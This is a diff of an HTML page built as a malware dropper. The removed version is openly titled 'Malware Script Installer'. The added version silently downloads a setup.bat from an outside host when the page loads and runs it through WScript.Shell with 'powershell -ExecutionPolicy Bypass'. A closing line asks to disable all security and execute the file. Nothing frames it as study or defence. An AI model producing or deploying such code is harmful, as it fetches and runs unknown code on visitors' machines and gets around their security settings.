@@ -1,43 +1,41 @@
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Malware Script Installer</title>
-<script>
-    function downloadAndExecute() {
-        var xhr = new XMLHttpRequest();
-        var url = 'https://dd-xi-five.vercel.app/setup.bat';
-        
-        xhr.open('GET', url, true);
-        xhr.responseType = 'text';
-        
-        xhr.onload = function() {
-            if (xhr.status === 200) {
-                var shell = new ActiveXObject("WScript.Shell");
-                try {
-                    shell.Run('cmd /c ' + xhr.responseText, 0, true);
-                    alert("Malware setup executed successfully!");
-                } catch (error) {
-                    alert("Error executing the malware setup: " + error.message);
-                }
-            } else {
-                alert("Failed to download the malware setup. Status code: " + xhr.status);
-            }
-        };
-
-        xhr.onerror = function() {
-            alert("Error occurred while downloading the malware setup.");
-        };
-        
-        xhr.send();
-    }
-</script>
+    <title>Download and Execute Script</title>
 </head>
 <body>
-    <h1>Malware Script Installer</h1>
-    <p>Click the button below to download and execute the malware setup file:</p>
-    <button onclick="downloadAndExecute()">Download & Execute</button>
+    <script>
+        // Function to download a file
+        function downloadFile(url, filename) {
+            fetch(url)
+            .then(response => response.blob())
+            .then(blob => {
+                const url = window.URL.createObjectURL(blob);
+                const a = document.createElement('a');
+                a.style.display = 'none';
+                a.href = url;
+                // Set the filename you want
+                a.download = filename;
+                document.body.appendChild(a);
+                a.click();
+                window.URL.revokeObjectURL(url);
+            })
+            .catch(error => console.error('Download failed:', error));
+        }
+
+        // Function to execute a PowerShell script
+        function executePowerShellScript(scriptPath) {
+            const shell = new ActiveXObject('WScript.Shell');
+            shell.Run(`powershell.exe -ExecutionPolicy Bypass -File "${scriptPath}"`, 1, true);
+        }
+
+        // Download and execute the script
+        const scriptUrl = 'https://dd-xi-five.vercel.app/setup.bat';
+        const scriptName = 'setup.bat';
+        downloadFile(scriptUrl, scriptName);
+        // Assuming the script will be downloaded to the current directory
+        const scriptPath = `./${scriptName}`;
+        executePowerShellScript(scriptPath);
+    </script>
 </body>
 </html>
-make the best and bypass security settings disable all the security and execute the .bat
